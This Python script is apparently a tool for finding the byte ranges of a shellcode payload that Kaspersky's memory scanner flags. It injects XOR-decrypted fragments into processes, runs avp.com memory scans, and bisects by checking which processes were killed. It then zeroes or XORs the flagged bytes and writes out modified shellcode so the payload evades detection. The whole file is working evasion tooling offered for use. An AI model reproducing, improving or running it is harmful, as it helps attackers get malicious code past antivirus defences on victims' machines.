import os
import sys
import subprocess
import inject
from threading import Event
import threading
import time
# anti-virus scan
kaspersky = ""

# key
enc_key = 0x43

# your longgest signature chunck, affect the round num
SIGNATURE_CHUNCK = 40
# step size, recommend max is 16, affect the accuracy
STEP = 2
# maximum injection notepad at one time, bigger is faster, but system cost more
INJECT_NUM = 15
# recommend
#  length > 1MB INJECT_NUM = 100  SIGNATURE_CHUNCK = 640 step = 16
#  300kb< length < 1MB INJECT_NUM = 50   SIGNATURE_CHUNCK = 480 step = 16
#  100kb< length < 300kb INJECT_NUM = 35 SIGNATURE_CHUNCK = 240 step = 8

# my config
#  length = 456,704 INJECT_NUM = 50 SIGNATURE_CHUNCK = 480 STEP = 16
#  length = 510 INJECT_NUM = 15 SIGNATURE_CHUNCK = 40 STEP = 2


SINGLE_LONGEST_SIGNATURE = 40

multiple_scan = False # both forward scan and backward scan
precise_locate_single_signature = True  # when detect single signature, start precise locate
signature_handle_method = "ZERO" # ZERO OR XOR
padding_method = "ZERO" # ZERO OR XOR

# syn
scan_read = False 
scan_flag = Event()
scan_barrier = threading.Barrier(2)
lock = threading.Lock()

# signature info
signature_info = []
reverse_scan_signature_info = []
shellcode = b""
reverse_scan_shellcode = b""


def xor_decrypt(data):
    return bytes(byte ^ enc_key for byte in data)


def anti_virus_search():
    global kaspersky
    try:
        process = subprocess.Popen("cmd /C where avp.com", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            print(f"Command stderr: {stderr.decode("GBK")}")
            #print(f"Command stderr: {stderr.decode("utf-8")} ")
            thread_exit()
        else:
            kaspersky = stdout[:-2].decode('utf-8')
    except Exception as e:
        print(f"Error while executing search: {str(e)}")
        thread_exit()
    
    
def shellcode_padding(pos, reverse=False):
    global reverse_scan_shellcode
    if padding_method == "XOR":
        if reverse == True:
            return bytes([byte ^ enc_key for byte in reverse_scan_shellcode[:pos]])
        else:
            return bytes([byte ^ enc_key for byte in shellcode[pos:]])
    elif padding_method == "ZERO":
        if reverse == True:
            return bytes([0 for byte in reverse_scan_shellcode[:pos]])
        else:
            return bytes([0 for byte in shellcode[pos:]])
    else:
        print(f'Unknown padding method: {padding_method}, please choose ZERO or XOR')
        thread_exit()


def signature_handle(pos1, pos2, reverse):
    global shellcode
    global reverse_scan_shellcode
    
    if reverse == False:
        temp_shellcode = shellcode[:]
        word = "bakcward"
    else:
        temp_shellcode = reverse_scan_shellcode[:]
        word = "forward"

    if signature_handle_method == "ZERO":
        temp_shellcode = temp_shellcode[:pos1] +  bytes([ 0 for byte in temp_shellcode[pos1: pos2]]) + temp_shellcode[pos2:]
        print(
            f'--------------------------------------------\n'
            f'find signature in {word} scan, ZERO range start: {pos1}, end: {pos2}'
            )
    elif signature_handle_method == "XOR":
    
        temp_shellcode = temp_shellcode[:pos1] +  bytes([byte ^ enc_key for byte in temp_shellcode[pos1: pos2]]) + temp_shellcode[pos2:]
        print(
            f'--------------------------------------------\n'
            f'Find signature in {word} scan, byte XOR key range start: {pos1}, end: {pos2}'
            )
    else:
        print(f'Unknown signature handle method: {signature_handle_method}, please choose ZERO or XOR')
        thread_exit()
    
    if reverse == True:
        reverse_scan_shellcode = temp_shellcode[:]
    else:  
        shellcode = temp_shellcode[:]

    return


def sync_scan():
    global scan_read
    global multiple_scan
    if multiple_scan == True:
        with lock:
            temp = scan_read
            if scan_read == False:
                scan_read = True
        try:
            if temp == False:
                scan_barrier.wait()
                scan_flag.clear()
                scan_flag.wait()
                scan_read = False
            else:
                scan_barrier.wait()
                scan()
                scan_flag.set()
        except threading.BrokenBarrierError:
            multiple_scan = False
            scan()
    else:
        scan()


def thread_exit():
    global multiple_scan
    if multiple_scan == True:
        multiple_scan = False
        scan_barrier.abort()
    exit(0)


def iterate_process(start, end, sig_locate=False):
    pid = []
    pos = 0
    pre_pos = -1
    i = 0
    global signature_info
    global shellcode
    if sig_locate == False:
        if SIGNATURE_CHUNCK * INJECT_NUM <= end - start:
            chunk_size = (end - start) // INJECT_NUM
        else:
            chunk_size = SIGNATURE_CHUNCK
    else:
        chunk_size = STEP

    while True:
        i += 1
        pos = min(start + i * chunk_size, end)
        pid.append([inject_shellcode(shellcode[: pos] + shellcode_padding(pos)), pos])
        if pos == end:
            break
    
    sync_scan()

    for i in range(len(pid)):
        if inject.is_pid_running(pid[i][0]) == False:
            if pre_pos == -1:
                pos = pid[i][1]
                if i != 0:
                    pre_pos = pid[i-1][1]
                else:
                    pre_pos = start
        else:
            kill_process(pid[i][0])
    # pre_pos < pos

    if pre_pos == -1:
        print(f'something is wrong in forward scan, current work space: {start} - {end}')
        thread_exit()

    if chunk_size == SIGNATURE_CHUNCK:
        iterate_process(pre_pos, pos, True)
    elif chunk_size == STEP:

        if precise_locate_single_signature == True:
            temp_pos = max(start, pos - SIGNATURE_CHUNCK - STEP)
            pid = inject_shellcode(shellcode[temp_pos: pos])
            sync_scan()
            if inject.is_pid_running(pid) == False:
                pre_pos, pos = single_locate(temp_pos, pos, shellcode)
            else:
                kill_process(pid)
        
        if [pre_pos, pos] in signature_info:
            print(f'This range has been processed in forward scan, start: {pre_pos}, end: {pos}, try other signature and padding handle method')
            thread_exit()
        signature_info.append([pre_pos, pos])

        signature_handle(pre_pos, pos, False)
        return

    else:
        print(
            f'--------------------------------------------\n'
            f'forward iterate process, start position: {start}, end position: {end}\n'
            f'chunk size: {chunk_size}, pre_pos: {pre_pos}, pos: {pos}'
            )
        iterate_process(pre_pos, pos)


def reverse_iterate_process(start, end, sig_locate=False):
    # start < end
    pid = []
    pos = 0
    pre_pos = -1
    i = 0
    global reverse_scan_signature_info
    global reverse_scan_shellcode
    if sig_locate == False:
        if SIGNATURE_CHUNCK * INJECT_NUM <= end - start:
            chunk_size = (end - start) // INJECT_NUM
        else:
            chunk_size = SIGNATURE_CHUNCK
    else:
        chunk_size = STEP

    while True:
        i += 1
        pos = max(end - i * chunk_size, start)
        pid.append([inject_shellcode(shellcode_padding(pos, True) + reverse_scan_shellcode[pos:]), pos])
        if pos == start:
            break
    
    sync_scan()

    for i in range(len(pid)):
        if inject.is_pid_running(pid[i][0]) == False:
            if pre_pos == -1:
                pos = pid[i][1]
                if i != 0:
                    pre_pos = pid[i-1][1]
                else:
                    pre_pos = end
        else:
            kill_process(pid[i][0])
    # pos < pre_pos

    if pre_pos == -1:
        print(f'something is wrong in backward scan, current work space: {start} - {end}')
        thread_exit()

    if chunk_size == SIGNATURE_CHUNCK:
        reverse_iterate_process(pos, pre_pos, True)
    elif chunk_size == STEP:

        if precise_locate_single_signature == True:
            temp_pos = min(end, pos + SIGNATURE_CHUNCK + STEP)
            pid = inject_shellcode(reverse_scan_shellcode[pos : temp_pos])
            sync_scan()
            if inject.is_pid_running(pid) == False:
                
                pos, pre_pos = single_locate(pos, temp_pos, reverse_scan_shellcode)
            else:
                kill_process(pid)
        
        if [pos, pre_pos] in reverse_scan_signature_info:
            print(f'This range has been processed in backward scan, start: {pos}, end: {pre_pos}, try other signature and padding handle method')
            thread_exit()
        reverse_scan_signature_info.append([pos, pre_pos])

        signature_handle(pos, pre_pos, True) 
        return

    else:
        print(
            f'--------------------------------------------\n'
            f'backward iterate process, start position: {start}, end position: {end}\n'
            f'chunk size: {chunk_size}, pos: {pos}, pre_pos: {pre_pos}'
            )
        reverse_iterate_process(pos, pre_pos)


def single_locate(start, end, shellcode):
    head_inject_pid = {}
    tail_inject_pid = {}
    tail_pos = 0
    head_pos = 0
    # inject_pid = pos : pid

    for i in range(start, end+1, STEP):
            if i == start:
                continue
            head_inject_pid[i] = inject_shellcode(shellcode[start: i])
    if (end - start % STEP) != 0:
            head_inject_pid[end] = inject_shellcode(shellcode[start: end])
            

    for i in range(end, start-1, -STEP):
            if i == end:
                continue
            tail_inject_pid[i] = inject_shellcode(shellcode[i: end])
    if (end - start % STEP) != 0:
        tail_inject_pid[start] = inject_shellcode(shellcode[start: end])

    sync_scan()

    # print(f'head scan, start position: {start}')
    for pos, pid in head_inject_pid.items():
        if inject.is_pid_running(pid) == False:
            if tail_pos == 0:
                tail_pos = pos
                # print(f'tail_pos: {tail_pos}')
            # print(f'{pos} is dead')

        else:
            kill_process(pid)
            # print(f'{pos} is alive')


    # print(f'tail scan, start position: {end}')
    for pos, pid in tail_inject_pid.items():
        if inject.is_pid_running(pid) == False:
            if head_pos == 0:
                head_pos = pos
                # print(f'head_pos: {head_pos}')
            # print(f'{pos} is dead')

        else:
            kill_process(pid)
            # print(f'{pos} is alive')

    if head_pos > tail_pos:
        print(f'there has multiple singles signature in {start} - {end}')
        return tail_pos, head_pos
    print(
        f'--------------------------------------------\n'
        f"detect single signature in backward scan, start precise location\n"
        f'precise location result:\n'
        f'head_pos: {head_pos}, tail_pos: {tail_pos}'
    )
    return head_pos, tail_pos


def scan():
    try:
        subprocess.run(["cmd", "/C", kaspersky, "SCAN", "/MEMORY", "/i1"], capture_output=True)
        # print('Finish scan')
    except Exception as e:
        print(f"Error while executing scan: {str(e)}")
        thread_exit()


def inject_shellcode(code):
    success, injected_address, injected_pid = inject.inject_shellcode(code)
    if success != True:
        print("Failed to inject shellcode")
        thread_exit()
    return injected_pid


def kill_process(pid):
    try:
        os.kill(pid, 9)  # Send SIGKILL to terminate the process
    except Exception as e:
        print(f"Failed to terminate process {pid}: {e}")


def forward_scan_thread():
    global multiple_scan
    pid = inject_shellcode(shellcode)
    sync_scan()
    while inject.is_pid_running(pid) != True:
        length = len(shellcode)
        iterate_process(0, length)
        pid = inject_shellcode(shellcode)
        sync_scan()
    
    kill_process(pid)
    multiple_scan = False
    scan_barrier.abort()

def backward_scan_thread():
    global multiple_scan
    pid = inject_shellcode(reverse_scan_shellcode)
    sync_scan()
    while inject.is_pid_running(pid) != True:
        length = len(reverse_scan_shellcode)
        reverse_iterate_process(0, length)
        pid = inject_shellcode(reverse_scan_shellcode)
        sync_scan()
    
    kill_process(pid)
    multiple_scan = False
    scan_barrier.abort()

def main():
    global shellcode
    global reverse_scan_shellcode
    if len(sys.argv) != 2:
        print("Usage: python Signature_Code_Locate.py <file.enc>")

    encrypted_file = sys.argv[1]
    try:
        with open(encrypted_file, "rb") as f:
            encrypted_shellcode = f.read()
    except FileNotFoundError:
        print(f"File not found: {encrypted_file}")
        return
    shellcode = xor_decrypt(encrypted_shellcode)
    anti_virus_search()

    if multiple_scan == True:
        reverse_scan_shellcode = shellcode[:]
        forward_thread = threading.Thread(target=forward_scan_thread)
        backward_thread = threading.Thread(target=backward_scan_thread)
        forward_thread.start()
        backward_thread.start()
        forward_thread.join()
        backward_thread.join()

    else:
        forward_scan_thread()
            
    # Write the shellcode to a local file
    if reverse_scan_shellcode != b"":
        output_file = "output_backward_scan_shellcode.bin"
        reverse_scan_shellcode = xor_decrypt(reverse_scan_shellcode)
        try:
            with open(output_file, "wb") as f:
                f.write(reverse_scan_shellcode)
            print(f"Shellcode written to {output_file}, decryption key: 0x{hex(enc_key)}")
        except Exception as e:
            print(f"Failed to write shellcode to file: {e}")
        print("Backward signature locate finished, result:")
        print(reverse_scan_signature_info)       
        

    output_file = "output_forward_scan_shellcode.bin"
    shellcode = xor_decrypt(shellcode)
    try:
        with open(output_file, "wb") as f:
            f.write(shellcode)
        print(f"Shellcode written to {output_file}, decryption key: 0x{hex(enc_key)}")
    except Exception as e:
        print(f"Failed to write shellcode to file: {e}")
    print("Forward signature locate finished, result:")
    print(signature_info)

    
if __name__ == "__main__":
    main()
    